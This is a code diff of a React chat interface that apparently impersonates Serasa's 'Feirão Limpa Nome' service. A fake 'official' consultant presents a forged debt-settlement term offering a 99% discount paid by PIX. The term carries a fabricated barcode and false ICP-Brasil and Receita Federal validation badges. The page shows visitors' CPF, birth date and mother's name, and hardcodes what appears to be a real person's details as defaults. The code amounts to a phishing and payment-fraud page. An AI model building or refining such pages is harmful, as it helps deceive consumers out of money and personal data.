+              className="h-6 sm:h-7 w-auto object-contain flex-shrink-0"
+              priority
+            />
+            <div className="h-5 w-[1px] bg-white/25 hidden xs:block"></div>
+            <div className="min-w-0">
+              <div className="flex items-center gap-1.5">
+                <span className={`w-2 h-2 rounded-full flex-shrink-0 ${isFernandaJoined ? "bg-emerald-400 animate-pulse" : "bg-pink-300"}`}></span>
+                <span className="font-bold text-xs sm:text-sm truncate leading-tight">
+                  {isFernandaJoined ? "Fernanda - Consultora" : "Atendimento Serasa"}
+                </span>
+              </div>
+              <span className="text-[10px] text-pink-100/90 block leading-tight truncate">
+                {isFernandaJoined ? "Atendimento Oficial Serasa" : "Canal Oficial de Atendimento"}
+              </span>
+            </div>
           </div>
+
           <div className="flex items-center gap-2 flex-shrink-0">
             <div className="text-right hidden sm:block">
-              <p className="text-xs opacity-75">Feirao Limpa Nome</p>
-              <p className="text-xs font-semibold">Ultimo dia!</p>
+              <p className="text-[11px] opacity-80">Feirão Limpa Nome</p>
+              <p className="text-xs font-bold text-amber-200">Último dia!</p>
             </div>
-            <div className="w-9 h-9 sm:w-10 sm:h-10 bg-white/20 rounded-full flex items-center justify-center overflow-hidden">
+            <div className="w-9 h-9 sm:w-10 sm:h-10 rounded-full bg-white/20 p-0.5 border border-white/50 overflow-hidden shadow-xs">
               <Image
-                src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
+                src={isFernandaJoined ? "/fernanda-avatar.jpg" : "/serasa-avatar.png"}
                 alt="Atendente"
-                width={36}
-                height={36}
-                className="w-8 h-8 sm:w-9 sm:h-9 rounded-full object-cover"
+                width={40}
+                height={40}
+                className="w-full h-full rounded-full object-cover"
+                priority
               />
             </div>
           </div>
         </div>
+
+        {/* Faixa Inferior de Identificação do Cliente: Nome + CPF Mascarado com Asteriscos */}
+        {userData && (
+          <div className="bg-[#b80065] px-4 py-1.5 text-white text-[11px] border-t border-pink-400/25 shadow-inner">
+            <div className="max-w-4xl mx-auto flex items-center justify-between gap-2">
+              <div className="flex items-center gap-1.5 min-w-0 truncate">
+                <User className="w-3.5 h-3.5 text-pink-200 flex-shrink-0" />
+                <span className="font-semibold text-white truncate text-[11px]">
+                  {userData.nome}
+                </span>
+              </div>
+              <div className="flex items-center gap-1 flex-shrink-0 bg-black/25 px-2 py-0.5 rounded border border-white/10 font-mono">
+                <span className="text-[9.5px] uppercase text-pink-200 font-sans tracking-wider">CPF:</span>
+                <span className="font-bold tracking-wider text-[11px] text-white">
+                  {maskCPF(userData.cpf)}
+                </span>
+              </div>
+            </div>
+          </div>
+        )}
       </header>
 
-      {/* Area Rolavel de Mensagens com scroll nativo e suave */}
+      {/* Área Rolável de Mensagens */}
       <main
         ref={chatContainerRef}
         className="flex-1 overflow-y-auto overflow-x-hidden relative overscroll-y-contain"
@@ -1239,388 +1707,418 @@ function ChatContent() {
       >
         <div className="max-w-4xl mx-auto bg-white/80 backdrop-blur-sm min-h-full relative shadow-xl">
           <div className="p-3.5 sm:p-4 space-y-4 pb-[max(5rem,calc(env(safe-area-inset-bottom)+4rem))]">
-          {isLoading && (
-            <div className="flex justify-center py-8">
-              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-600"></div>
-            </div>
-          )}
+            {isLoading && (
+              <div className="flex justify-center py-8">
+                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-600"></div>
+              </div>
+            )}
 
-          {messages.map((message, index) => (
-            <div key={`${message.id}-${index}`}>
-              <div className={`flex ${message.sender === "bot" ? "justify-start" : "justify-end"}`}>
-                <div className={message.sender === "bot" ? "w-full max-w-[340px] sm:max-w-[380px] lg:max-w-md" : "max-w-[85%] sm:max-w-md"}>
-                  <div
-                    className={`flex items-start gap-2 mb-2 ${message.sender === "bot" ? "flex-row" : "flex-row-reverse"}`}
-                  >
-                    <div
-                      className={`w-8 h-8 ${message.sender === "bot" ? "bg-pink-600" : "bg-blue-500"} rounded-full flex items-center justify-center text-white text-sm font-semibold flex-shrink-0`}
-                    >
-                      {message.sender === "bot" ? (
-                        <Image
-                          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
-                          alt="Serasa"
-                          width={32}
-                          height={32}
-                          className="w-8 h-8 rounded-full"
-                        />
-                      ) : (
-                        userData?.nome?.charAt(0).toUpperCase() || "U"
-                      )}
-                    </div>
-                    <div className={message.sender === "bot" ? "flex-1 min-w-0 flex flex-col items-start" : "flex flex-col items-end"}>
+            {messages.map((message, index) => (
+              <div key={`${message.id}-${index}`}>
+                {message.type === "system" ? (
+                  <div className="flex justify-center my-2">
+                    <span className="text-[11px] font-medium text-pink-700 bg-pink-100/90 border border-pink-200 px-3 py-1 rounded-full shadow-xs">
+                      {message.content}
+                    </span>
+                  </div>
+                ) : (
+                  <div className={`flex ${message.sender === "bot" ? "justify-start" : "justify-end"}`}>
+                    <div className={message.sender === "bot" ? "w-full max-w-[340px] sm:max-w-[380px] lg:max-w-md" : "max-w-[85%] sm:max-w-md"}>
                       <div
-                        className={`${
-                          message.type === "agreement-document" || message.type === "score-gauge" || message.type === "payment-guide"
-                            ? "bg-transparent border-0 p-0 shadow-none w-full"
-                            : message.type === "data-confirmation"
-                            ? "w-full"
-                            : message.sender === "bot"
-                            ? "w-fit max-w-full bg-gray-100 border-gray-200 shadow-sm rounded-2xl rounded-tl-xs px-4 py-2.5 border text-gray-800"
-                            : "w-fit bg-pink-600 text-white shadow-sm rounded-2xl rounded-tr-xs px-4 py-2.5 border-0 font-medium"
-                        }`}
+                        className={`flex items-start gap-2 mb-2 ${message.sender === "bot" ? "flex-row" : "flex-row-reverse"}`}
                       >
-                        {message.type === "image" && message.imageUrl && (
-                          <div className="mb-2">
+                        <div
+                          className={`w-8 h-8 ${message.sender === "bot" ? "bg-pink-600" : "bg-blue-500"} rounded-full flex items-center justify-center text-white text-sm font-semibold flex-shrink-0 overflow-hidden shadow-xs border border-pink-200`}
+                        >
+                          {message.sender === "bot" ? (
                             <Image
-                              src={message.imageUrl || "/placeholder.svg"}
-                              alt=""
-                              width={300}
-                              height={200}
-                              className="rounded-lg w-full"
-                              onLoad={() => scrollToBottom("smooth")}
+                              src={message.avatar || (isFernandaJoined ? "/fernanda-avatar.jpg" : "/serasa-avatar.png")}
+                              alt={isFernandaJoined ? "Fernanda Atendente" : "Serasa Oficial"}
+                              width={32}
+                              height={32}
+                              className="w-full h-full rounded-full object-cover"
                             />
-                          </div>
-                        )}
+                          ) : (
+                            userData?.nome?.charAt(0).toUpperCase() || "U"
+                          )}
+                        </div>
+                        <div className={message.sender === "bot" ? "flex-1 min-w-0 flex flex-col items-start" : "flex flex-col items-end"}>
+                          <div
+                            className={`${
+                              message.type === "agreement-document" || message.type === "score-gauge" || message.type === "payment-guide"
+                                ? "bg-transparent border-0 p-0 shadow-none w-full"
+                                : message.type === "data-confirmation"
+                                ? "w-full"
+                                : message.sender === "bot"
+                                ? "w-fit max-w-full bg-gray-100 border-gray-200 shadow-sm rounded-2xl rounded-tl-xs px-4 py-2.5 border text-gray-800"
+                                : "w-fit bg-pink-600 text-white shadow-sm rounded-2xl rounded-tr-xs px-4 py-2.5 border-0 font-medium"
+                            }`}
+                          >
+                            {message.type === "local-video" && message.videoUrl && (
+                              <InlineVideoPlayer
+                                videoUrl={message.videoUrl}
+                                onFinished={triggerDataVerificationFlow}
+                              />
+                            )}
 
-                        {message.type === "score-gauge" && (
-                          <div className="my-1">
-                            <AnimatedScoreGauge targetScore={message.data?.targetScore || 129} />
-                          </div>
-                        )}
-
-                        {message.type === "audio" && message.audioUrl && (
-                          <div className="mb-1">
-                            <ModernAudioPlayer audioUrl={message.audioUrl} messageId={message.id} />
-                          </div>
-                        )}
-
-                        {message.type === "video" && message.videoUrl && (
-                          <div className="mb-2">
-                            <iframe
-                              src={`${message.videoUrl}&autoplay=1`}
-                              width="300"
-                              height="200"
-                              frameBorder="0"
-                              allow="autoplay; fullscreen; picture-in-picture"
-                              className="rounded-lg w-full"
-                            ></iframe>
-                          </div>
-                        )}
-
-                        {message.type === "embed" && message.embedUrl && (
-                          <div className="mb-2">
-                            <iframe
-                              src={message.embedUrl}
-                              width="300"
-                              height="400"
-                              frameBorder="0"
-                              className="rounded-lg w-full border"
-                              title="Carta de Quitação"
-                            ></iframe>
-                          </div>
-                        )}
-
-                        {message.type === "agreement-document" && message.data ? (
-                          <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 select-none font-sans">
-                            <div className="bg-white border border-slate-300 rounded-xl shadow-md overflow-hidden text-xs text-slate-800">
-                              {/* Faixa magenta oficial Serasa */}
-                              <div className="h-1 bg-[#e6007e]"></div>
-
-                              {/* Cabeçalho Compacto do Documento */}
-                              <div className="px-3.5 py-2.5 bg-slate-50 border-b border-slate-200">
-                                <div className="flex items-center justify-between">
-                                  <div className="flex items-center">
-                                    <Image
-                                      src="/serasa-limpa-nome-color.svg"
-                                      alt="Serasa Limpa Nome"
-                                      width={125}
-                                      height={30}
-                                      className="h-5 w-auto object-contain"
-                                    />
-                                  </div>
-                                  <span className="text-[9px] font-semibold text-slate-600 bg-slate-200/80 px-2 py-0.5 rounded">
-                                    VIA DO TITULAR
-                                  </span>
-                                </div>
-                                <div className="mt-1.5 flex items-center justify-between text-[11px] pt-1.5 border-t border-slate-200/60">
-                                  <span className="font-bold text-slate-900 uppercase text-[10px]">
-                                    Termo de Quitação Extrajudicial
-                                  </span>
-                                  <span className="text-[10px] font-mono font-bold text-slate-600">
-                                    Nº {message.data.acordoId || "83N2L618362E"}
-                                  </span>
-                                </div>
+                            {message.type === "image" && message.imageUrl && (
+                              <div className="mb-2">
+                                <Image
+                                  src={message.imageUrl}
+                                  alt=""
+                                  width={340}
+                                  height={220}
+                                  className="rounded-lg w-full h-auto object-contain"
+                                  onLoad={() => scrollToBottom("smooth")}
+                                />
                               </div>
+                            )}
 
-                              {/* Dados do Titular em Linha Dupla Compacta */}
-                              <div className="px-3.5 py-2 bg-white border-b border-slate-100 flex items-center justify-between">
-                                <div className="min-w-0 pr-2">
-                                  <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
-                                    Titular Beneficiário(a)
-                                  </span>
-                                  <span className="font-bold text-slate-900 text-xs block truncate max-w-[190px]">
-                                    {message.data.nome || "Cliente"}
-                                  </span>
-                                </div>
-                                <div className="text-right flex-shrink-0">
-                                  <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
-                                    CPF
-                                  </span>
-                                  <span className="font-mono text-xs text-slate-700 font-semibold">
-                                    {formatCPF(message.data.cpf)}
-                                  </span>
-                                </div>
+                            {message.type === "score-gauge" && (
+                              <div className="my-1">
+                                <AnimatedScoreGauge targetScore={message.data?.targetScore || 291} />
                               </div>
+                            )}
 
-                              {/* Demonstrativo Financeiro Compacto */}
-                              <div className="px-3.5 py-2.5 bg-slate-50/50 space-y-1.5 text-xs">
-                                <div className="flex justify-between items-center text-slate-600">
-                                  <span>Dívida Total Original:</span>
-                                  <span className="line-through text-slate-400 font-mono font-medium">
-                                    R$ {message.data.valorDivida || "7.566,52"}
-                                  </span>
-                                </div>
-                                <div className="flex justify-between items-center text-slate-600">
-                                  <span className="text-emerald-700 font-medium">Desconto Feirão (98,7%):</span>
-                                  <span className="font-bold text-emerald-700 font-mono">
-                                    - R$ {message.data.valorDesconto || "7.488,05"}
-                                  </span>
-                                </div>
-                                <div className="flex justify-between items-center text-slate-600">
-                                  <span>Juros e Encargos:</span>
-                                  <span className="font-semibold text-slate-700">100% Isentos</span>
-                                </div>
-
-                                {/* Box do Valor Final a Pagar Compacto */}
-                                <div className="bg-[#f0fdf4] border border-[#86efac] rounded-lg p-2.5 my-1.5">
-                                  <div className="flex justify-between items-center">
-                                    <div>
-                                      <span className="text-[9px] text-emerald-800 font-bold uppercase block tracking-wider">
-                                        Total a Pagar (Único)
-                                      </span>
-                                      <span className="text-xl font-black text-[#15803d] font-mono leading-tight">
-                                        R$ {message.data.valorContrato || "78,47"}
-                                      </span>
-                                    </div>
-                                    <div className="text-right">
-                                      <span className="bg-emerald-100 text-emerald-800 px-1.5 py-0.5 rounded text-[9px] font-bold inline-block mb-0.5">
-                                        PIX À VISTA
-                                      </span>
-                                      <span className="text-[10px] text-slate-600 block font-mono">
-                                        Venc: {message.data.vencimento || new Date().toLocaleDateString("pt-BR")}
-                                      </span>
-                                    </div>
-                                  </div>
-                                </div>
+                            {message.type === "audio" && message.audioUrl && (
+                              <div className="mb-1">
+                                <ModernAudioPlayer
+                                  audioUrl={message.audioUrl}
+                                  messageId={message.id}
+                                  onFinished={message.id === "audio-3-fernanda" ? triggerFeiraoQuestion : undefined}
+                                />
                               </div>
+                            )}
 
-                              {/* Cláusula de Validade e Baixa Legal Curta */}
-                              <div className="px-3 py-2 bg-amber-50/80 border-t border-b border-amber-200 text-[10px] text-amber-900 leading-snug">
-                                <strong>Aviso:</strong> Válido exclusivamente para a titular. A quitação via PIX gera baixa automática e cancelamento das pendências na Serasa e SPC em até 1 hora útil.
+                            {message.type === "embed" && message.embedUrl && (
+                              <div className="mb-2 w-full max-w-[340px] sm:max-w-[380px]">
+                                <iframe
+                                  src={message.embedUrl}
+                                  width="300"
+                                  height="400"
+                                  frameBorder="0"
+                                  className="rounded-xl w-full border border-slate-200 shadow-md bg-white"
+                                  title="Carta de Quitação"
+                                ></iframe>
                               </div>
+                            )}
 
-                              {/* Código de barras compacto */}
-                              <div className="px-3 py-2 bg-white flex flex-col items-center">
-                                <div className="h-5 w-full max-w-[220px] flex items-stretch justify-between px-1 opacity-70">
-                                  {[3,1,2,1,4,1,2,3,1,2,4,1,2,1,3,2,1,4,1,2,3,1,2,4,1,2].map((w, idx) => (
-                                    <div key={idx} className="bg-slate-900" style={{ width: `${w}px` }} />
-                                  ))}
-                                </div>
-                                <div className="text-[8.5px] font-mono text-slate-700 mt-1 font-semibold">
-                                  83N20.61836 2E987.050012 34000.784700 1 98760000007847
-                                </div>
-                                <div className="text-[7.5px] uppercase tracking-wider text-slate-400 mt-0.5">
-                                  Certificação Digital Serasa Experian • ICP-Brasil
-                                </div>
-                              </div>
-                            </div>
-                          </div>
-                        ) : message.type === "payment-guide" ? (
-                          <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 font-sans">
-                            <div className="bg-white rounded-2xl border border-pink-100 shadow-md p-4 text-xs overflow-hidden">
-                              <div className="h-1 bg-[#e6007e] -mx-4 -mt-4 mb-3"></div>
-                              <div className="flex items-center gap-2.5 pb-2.5 border-b border-slate-100">
-                                <div className="w-9 h-9 rounded-xl bg-pink-50 border border-pink-200 flex items-center justify-center text-[#e6007e] flex-shrink-0">
-                                  <QrCode className="w-5 h-5" />
-                                </div>
-                                <div>
-                                  <h4 className="font-bold text-slate-900 text-sm">A guia de pagamento foi gerada!</h4>
-                                  <p className="text-[11px] text-slate-500 font-mono">Acordo nº {message.data?.acordoId || "83N2L618362E"}</p>
-                                </div>
-                              </div>
+                            {message.type === "agreement-document" && message.data ? (
+                              <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 select-none font-sans">
+                                <div className="bg-white border border-slate-300 rounded-xl shadow-md overflow-hidden text-xs text-slate-800">
+                                  <div className="h-1 bg-[#e6007e]"></div>
 
-                              <div className="py-2.5 space-y-2 text-slate-600">
-                                <div className="flex justify-between items-center text-xs">
-                                  <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Beneficiário(a):</span>
-                                  <span className="font-bold text-slate-800 text-right truncate max-w-[180px]">{message.data?.nome || userData?.nome || "Cliente"}</span>
-                                </div>
-                                <div className="flex justify-between items-center text-xs">
-                                  <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Identificação (CPF):</span>
-                                  <span className="font-mono font-semibold text-slate-800">{formatCPF(message.data?.cpf || userData?.cpf || "")}</span>
-                                </div>
-                                <div className="flex justify-between items-center text-xs">
-                                  <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Modalidade:</span>
-                                  <span className="font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200 text-[11px]">PIX Baixa Imediata</span>
-                                </div>
-                                <div className="flex justify-between items-center text-xs">
-                                  <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Status:</span>
-                                  <span className="font-semibold text-amber-700 bg-amber-50 px-2 py-0.5 rounded border border-amber-200 text-[11px] flex items-center gap-1">
-                                    <Clock className="w-3 h-3" /> Aguardando Liquidação
-                                  </span>
-                                </div>
-                              </div>
-
-                              <div className="pt-2 border-t border-slate-100 text-[11px] text-slate-500 leading-tight">
-                                Clique no botão abaixo para ir à página de pagamento seguro e liberar seu comprovante de quitação.
-                              </div>
-                            </div>
-                          </div>
-                        ) : message.type === "data-confirmation" ? (
-                          <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 font-sans">
-                            <p className={`text-sm ${message.sender === "bot" ? "text-gray-800" : "text-white"} mb-3 whitespace-pre-line`}>
-                              {message.content}
-                            </p>
-                            {message.data && (
-                              <div className="bg-white rounded-2xl border border-slate-200/90 shadow-md p-4 text-xs">
-                                <div className="flex items-center justify-between pb-2.5 mb-2.5 border-b border-slate-100">
-                                  <div className="flex items-center gap-2">
-                                    <ShieldCheck className="w-4 h-4 text-pink-600" />
-                                    <span className="font-bold text-slate-800 text-xs">Dados Cadastrais Confirmados</span>
-                                  </div>
-                                  <span className="text-[10px] bg-emerald-50 text-emerald-600 font-semibold px-2 py-0.5 rounded-full border border-emerald-200">
-                                    Validação RFB
-                                  </span>
-                                </div>
-
-                                <div className="space-y-2.5">
-                                  <div>
-                                    <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nome Completo</span>
-                                    <span className="font-bold text-slate-900 text-sm leading-snug">{message.data.nome || "Cliente"}</span>
-                                  </div>
-
-                                  <div className="grid grid-cols-2 gap-2">
-                                    <div>
-                                      <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Identificação (CPF)</span>
-                                      <span className="font-mono font-semibold text-slate-800">{formatCPF(message.data.cpf || "")}</span>
-                                    </div>
-                                    <div>
-                                      <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nascimento</span>
-                                      <span className="font-semibold text-slate-800">{message.data.nascimento || "Localizado"}</span>
-                                    </div>
-                                  </div>
-
-                                  {message.data.mae && (
-                                    <div>
-                                      <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nome da Mãe</span>
-                                      <span className="font-medium text-slate-700">{message.data.mae}</span>
-                                    </div>
-                                  )}
-
-                                  <div className="grid grid-cols-2 gap-2">
-                                    {message.data.sexo && (
-                                      <div>
-                                        <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Sexo</span>
-                                        <span className="font-medium text-slate-700">{message.data.sexo}</span>
+                                  <div className="px-3.5 py-2.5 bg-slate-50 border-b border-slate-200">
+                                    <div className="flex items-center justify-between">
+                                      <div className="flex items-center">
+                                        <Image
+                                          src="/serasa-limpa-nome-color.svg"
+                                          alt="Serasa Limpa Nome"
+                                          width={125}
+                                          height={30}
+                                          className="h-5 w-auto object-contain"
+                                        />
                                       </div>
-                                    )}
-                                    <div>
-                                      <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Região / Atendimento</span>
-                                      <span className="font-semibold text-slate-800">{message.data.cidade || "Brasil"}</span>
+                                      <span className="text-[9px] font-semibold text-slate-600 bg-slate-200/80 px-2 py-0.5 rounded">
+                                        VIA DO TITULAR
+                                      </span>
+                                    </div>
+                                    <div className="mt-1.5 flex items-center justify-between text-[11px] pt-1.5 border-t border-slate-200/60">
+                                      <span className="font-bold text-slate-900 uppercase text-[10px]">
+                                        Termo de Quitação Extrajudicial
+                                      </span>
+                                      <span className="text-[10px] font-mono font-bold text-slate-600">
+                                        Nº {message.data.acordoId || "83N2L618362E"}
+                                      </span>
+                                    </div>
+                                  </div>
+
+                                  <div className="px-3.5 py-2 bg-white border-b border-slate-100 flex items-center justify-between">
+                                    <div className="min-w-0 pr-2">
+                                      <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
+                                        Titular Beneficiário(a)
+                                      </span>
+                                      <span className="font-bold text-slate-900 text-xs block truncate max-w-[190px]">
+                                        {message.data.nome || "Cliente"}
+                                      </span>
+                                    </div>
+                                    <div className="text-right flex-shrink-0">
+                                      <span className="text-[9px] font-bold text-slate-400 uppercase tracking-wider block">
+                                        CPF
+                                      </span>
+                                      <span className="font-mono text-xs text-slate-700 font-semibold">
+                                        {formatCPF(message.data.cpf)}
+                                      </span>
+                                    </div>
+                                  </div>
+
+                                  <div className="px-3.5 py-2.5 bg-slate-50/50 space-y-1.5 text-xs">
+                                    <div className="flex justify-between items-center text-slate-600">
+                                      <span>Dívida Total Original:</span>
+                                      <span className="line-through text-slate-400 font-mono font-medium">
+                                        R$ {message.data.valorDivida || "7.566,52"}
+                                      </span>
+                                    </div>
+                                    <div className="flex justify-between items-center text-slate-600">
+                                      <span className="text-emerald-700 font-medium">Desconto Feirão (99%):</span>
+                                      <span className="font-bold text-emerald-700 font-mono">
+                                        - R$ {message.data.valorDesconto || "7.488,05"}
+                                      </span>
+                                    </div>
+                                    <div className="flex justify-between items-center text-slate-600">
+                                      <span>Juros e Encargos:</span>
+                                      <span className="font-semibold text-slate-700">100% Isentos</span>
+                                    </div>
+
+                                    <div className="bg-[#f0fdf4] border border-[#86efac] rounded-lg p-2.5 my-1.5">
+                                      <div className="flex justify-between items-center">
+                                        <div>
+                                          <span className="text-[9px] text-emerald-800 font-bold uppercase block tracking-wider">
+                                            Total a Pagar (Único)
+                                          </span>
+                                          <span className="text-xl font-black text-[#15803d] font-mono leading-tight">
+                                            R$ {message.data.valorContrato || "78,47"}
+                                          </span>
+                                        </div>
+                                        <div className="text-right">
+                                          <span className="bg-emerald-100 text-emerald-800 px-1.5 py-0.5 rounded text-[9px] font-bold inline-block mb-0.5">
+                                            PIX À VISTA
+                                          </span>
+                                          <span className="text-[10px] text-slate-600 block font-mono">
+                                            Venc: {message.data.vencimento || new Date().toLocaleDateString("pt-BR")}
+                                          </span>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+
+                                  <div className="px-3 py-2 bg-amber-50/80 border-t border-b border-amber-200 text-[10px] text-amber-900 leading-snug">
+                                    <strong>Aviso:</strong> Válido exclusivamente para o titular. A quitação via PIX gera baixa automática e cancelamento das pendências na Serasa e SPC em até 1 hora útil.
+                                  </div>
+
+                                  <div className="px-3 py-2 bg-white flex flex-col items-center">
+                                    <div className="h-5 w-full max-w-[220px] flex items-stretch justify-between px-1 opacity-70">
+                                      {[3,1,2,1,4,1,2,3,1,2,4,1,2,1,3,2,1,4,1,2,3,1,2,4,1,2].map((w, idx) => (
+                                        <div key={idx} className="bg-slate-900" style={{ width: `${w}px` }} />
+                                      ))}
+                                    </div>
+                                    <div className="text-[8.5px] font-mono text-slate-700 mt-1 font-semibold">
+                                      83N20.61836 2E987.050012 34000.784700 1 98760000007847
+                                    </div>
+                                    <div className="text-[7.5px] uppercase tracking-wider text-slate-400 mt-0.5">
+                                      Certificação Digital Serasa Experian • ICP-Brasil
                                     </div>
                                   </div>
                                 </div>
+                              </div>
+                            ) : message.type === "payment-guide" ? (
+                              <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 font-sans">
+                                <div className="bg-white rounded-2xl border border-pink-100 shadow-md p-4 text-xs overflow-hidden">
+                                  <div className="h-1 bg-[#e6007e] -mx-4 -mt-4 mb-3"></div>
+                                  <div className="flex items-center gap-2.5 pb-2.5 border-b border-slate-100">
+                                    <div className="w-9 h-9 rounded-xl bg-pink-50 border border-pink-200 flex items-center justify-center text-[#e6007e] flex-shrink-0">
+                                      <QrCode className="w-5 h-5" />
+                                    </div>
+                                    <div>
+                                      <h4 className="font-bold text-slate-900 text-sm">A guia de pagamento foi gerada!</h4>
+                                      <p className="text-[11px] text-slate-500 font-mono">Acordo nº {message.data?.acordoId || "83N2L618362E"}</p>
+                                    </div>
+                                  </div>
+
+                                  <div className="py-2.5 space-y-2 text-slate-600">
+                                    <div className="flex justify-between items-center text-xs">
+                                      <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Beneficiário(a):</span>
+                                      <span className="font-bold text-slate-800 text-right truncate max-w-[180px]">{message.data?.nome || userData?.nome || "Cliente"}</span>
+                                    </div>
+                                    <div className="flex justify-between items-center text-xs">
+                                      <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Identificação (CPF):</span>
+                                      <span className="font-mono font-semibold text-slate-800">{formatCPF(message.data?.cpf || userData?.cpf || "")}</span>
+                                    </div>
+                                    <div className="flex justify-between items-center text-xs">
+                                      <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Modalidade:</span>
+                                      <span className="font-semibold text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-200 text-[11px]">PIX Baixa Imediata</span>
+                                    </div>
+                                    <div className="flex justify-between items-center text-xs">
+                                      <span className="text-slate-400 text-[10px] uppercase font-bold tracking-wider">Status:</span>
+                                      <span className="font-semibold text-amber-700 bg-amber-50 px-2 py-0.5 rounded border border-amber-200 text-[11px] flex items-center gap-1">
+                                        <Clock className="w-3 h-3" /> Aguardando Liquidação
+                                      </span>
+                                    </div>
+                                  </div>
+
+                                  <div className="pt-2 border-t border-slate-100 text-[11px] text-slate-500 leading-tight">
+                                    Clique no botão abaixo para ir à página de pagamento seguro e liberar seu comprovante de quitação.
+                                  </div>
+                                </div>
+                              </div>
+                            ) : message.type === "data-confirmation" ? (
+                              <div className="w-full max-w-[340px] sm:max-w-[380px] my-1 font-sans">
+                                <p className="text-sm font-semibold text-gray-800 mb-2.5">
+                                  {message.content}
+                                </p>
+                                {message.data && (
+                                  <div className="bg-white rounded-2xl border border-slate-200 shadow-md p-4 text-xs">
+                                    <div className="flex items-center justify-between pb-2.5 mb-2.5 border-b border-slate-100">
+                                      <div className="flex items-center gap-2">
+                                        <ShieldCheck className="w-4 h-4 text-pink-600" />
+                                        <span className="font-bold text-slate-800 text-xs">Dados Cadastrais Confirmados</span>
+                                      </div>
+                                      <span className="text-[10px] bg-emerald-50 text-emerald-600 font-semibold px-2 py-0.5 rounded-full border border-emerald-200">
+                                        Validação RFB
+                                      </span>
+                                    </div>
+
+                                    <div className="space-y-2.5">
+                                      <div>
+                                        <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nome Completo</span>
+                                        <span className="font-bold text-slate-900 text-sm leading-snug">{message.data.nome || "Cliente"}</span>
+                                      </div>
+
+                                      <div className="grid grid-cols-2 gap-2">
+                                        <div>
+                                          <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Identificação (CPF)</span>
+                                          <span className="font-mono font-semibold text-slate-800">{formatCPF(message.data.cpf || "")}</span>
+                                        </div>
+                                        <div>
+                                          <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nascimento</span>
+                                          <span className="font-semibold text-slate-800">{message.data.nascimento || "01/08/1974"}</span>
+                                        </div>
+                                      </div>
+
+                                      <div>
+                                        <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Nome da Mãe</span>
+                                        <span className="font-medium text-slate-700">{message.data.mae || "ANTONIA MAGALHAES FERREIRA"}</span>
+                                      </div>
+
+                                      <div className="grid grid-cols-2 gap-2">
+                                        <div>
+                                          <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Sexo</span>
+                                          <span className="font-medium text-slate-700">{message.data.sexo || "Feminino"}</span>
+                                        </div>
+                                        <div>
+                                          <span className="text-[10px] uppercase font-bold text-slate-400 block tracking-wider">Região / Atendimento</span>
+                                          <span className="font-semibold text-slate-800">{message.data.cidade || "Iracema"}</span>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+                                )}
+                              </div>
+                            ) : (
+                              <div>
+                                <div
+                                  className={`text-sm ${message.sender === "bot" ? "text-gray-800" : "text-white"} leading-relaxed`}
+                                  dangerouslySetInnerHTML={{ __html: message.content.replace(/\n/g, "<br/>") }}
+                                />
                               </div>
                             )}
                           </div>
-                        ) : (
-                          <div>
-                            <p className={`text-sm ${message.sender === "bot" ? "text-gray-800" : "text-white"} whitespace-pre-line`}>{message.content}</p>
-                          </div>
-                        )}
+
+                          <p
+                            className={`text-xs text-gray-500 mt-1 ${message.sender === "bot" ? "text-left" : "text-right"}`}
+                          >
+                            {isMounted
+                              ? message.timestamp.toLocaleTimeString("pt-BR", {
+                                  hour: "2-digit",
+                                  minute: "2-digit",
+                                })
+                              : ""}
+                          </p>
+                        </div>
                       </div>
-                      <p
-                        className={`text-xs text-gray-500 mt-1 ${message.sender === "bot" ? "text-left" : "text-right"}`}
-                      >
-                        {isMounted
-                          ? message.timestamp.toLocaleTimeString("pt-BR", {
-                              hour: "2-digit",
-                              minute: "2-digit",
-                            })
-                          : ""}
-                      </p>
                     </div>
                   </div>
-                </div>
-              </div>
+                )}
 
-              {message.buttons && (
-                <div className="flex justify-end mt-2 mb-4">
-                  <div className="space-y-2 max-w-xs">
-                    {message.buttons
-                      .filter((button) => {
+                {message.buttons && (
+                  <div className="flex justify-end mt-2 mb-4">
+                    <div className="space-y-2 max-w-xs w-full">
+                      {message.buttons
+                        .filter((button) => {
+                          const buttonId = `${button.action}-${button.text}`
+                          return !clickedButtons.has(buttonId)
+                        })
+                        .map((button, index) => (
+                          <div
+                            key={index}
+                            onClick={() => handleButtonClick(button.action, button.text)}
+                            className="bg-pink-600 hover:bg-pink-700 active:scale-[0.98] text-white text-center rounded-xl px-6 py-3.5 cursor-pointer shadow-lg hover:shadow-xl transition-all duration-200 text-sm font-bold border-0 select-none animate-pulse"
+                          >
+                            {button.text}
